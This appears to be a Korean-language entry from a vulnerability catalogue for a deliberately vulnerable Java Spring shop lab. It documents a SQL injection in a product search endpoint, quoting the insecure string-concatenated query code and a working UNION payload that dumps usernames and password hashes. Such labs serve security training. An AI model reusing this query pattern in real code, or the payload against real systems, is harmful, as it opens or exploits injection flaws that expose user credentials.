# VULN-005 SQL Injection in product search/filter (java-spring)

- 대상 스택: java-spring
- 심각도: Critical
- 분류: A03:2021 Injection (SQL Injection)

## 위치

`apps/java-spring/src/main/java/com/vulnlab/shop/service/ProductService.java`, `GET /api/products` — `q`, `category` 쿼리 파라미터를 파라미터 바인딩 없이 native SQL 문자열에 직접 이어붙여 `EntityManager.createNativeQuery()`로 실행. VULN-001(node)과 동일한 엔드포인트/트리거 지점의 java 버전.

```java
StringBuilder sql = new StringBuilder("SELECT * FROM products WHERE 1=1");
if (hasQuery) sql.append(" AND LOWER(name) LIKE LOWER('%").append(query).append("%')");
if (hasCategory) sql.append(" AND category = '").append(category).append("'");
entityManager.createNativeQuery(sql.toString(), Product.class).getResultList();
```

## 트리거 방법

```
GET /api/products?category=x' UNION SELECT id,username,password_hash,0,role,bio,avatar_url,name,phone,postcode,address,created_at FROM users--
```

`products`(12컬럼: id,name,description,price,image_url,category,brand,sku,stock,option_name,option_values,created_at)에 컬럼 수를 맞춘 UNION 페이로드로 `users` 테이블(패스워드 해시 포함) 덤프 가능.

## 조치 상태: 미조치 (의도된 취약점)
